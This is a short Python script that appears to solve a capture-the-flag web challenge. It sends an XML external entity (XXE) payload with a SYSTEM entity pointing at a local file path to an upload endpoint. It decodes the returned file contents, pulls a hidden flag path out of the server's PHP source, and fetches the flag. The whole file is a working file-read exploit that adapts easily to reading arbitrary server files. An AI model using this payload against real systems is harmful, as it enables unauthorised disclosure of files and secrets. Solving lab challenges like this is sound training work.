import requests
import base64
import re

url_base = 'https://manual-for-the-apocalypse.secchallenge.crysys.hu/'


def solve():
    src = read_remote_file('/var/www/html/upload.php')
    flag_location = re.search('"(very_secret.*)"', src).group(1)
    flag_url = f'{url_base}/{flag_location}'
    flag = requests.get(flag_url).text
    return flag


def read_remote_file(path):
    st = f'<?xml version="1.0" encoding="UTF-8"?>\n' \
         f'<!DOCTYPE foo [ \n' \
         f'    <!ENTITY licenseNumber SYSTEM "file://{path}"> \n' \
         f']>\n' \
         f'<licenseNumber>\n' \
         f'    `&licenseNumber;`\n' \
         f'</licenseNumber>\n'

    files = {'file': ('x.xml', st)}

    rsp = requests.post(f'{url_base}/upload.php', files=files).text

    return base64.b64decode(rsp).decode("utf-8")


if __name__ == "__main__":
    print(solve())
